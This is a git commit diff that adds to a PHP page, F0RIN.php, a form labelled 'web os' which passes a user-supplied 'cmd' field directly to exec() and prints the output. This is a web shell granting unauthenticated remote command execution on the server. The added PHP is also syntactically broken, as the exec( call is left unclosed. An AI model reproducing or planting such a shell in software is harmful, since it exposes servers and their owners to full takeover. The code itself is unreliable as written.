08da9fac0af2472aebf051df888119018b484c82
Aqu1l3u5 <aqu1l3u5@gmail.com>
2017-02-11 20:52:19 +0100

    Update F0RIN.php

--- F0RIN.php
+++ F0RIN.php
@@ -6,5 +6,13 @@
 
 	<body>
 		<h1>F0RIN</h1>
-  </body>
+		<h2>This is an web os !</h2>
+		
+		<form method="post" action="F0RIN.php" enctype="multipart/form-data">
+     		        <input type="text" name="cmd"><input type="submit" name="send" value="send">
+		</form>
+		<?php 
+			echo exec($_POST["cmd"]
+		?>
+	</body>
 </html>
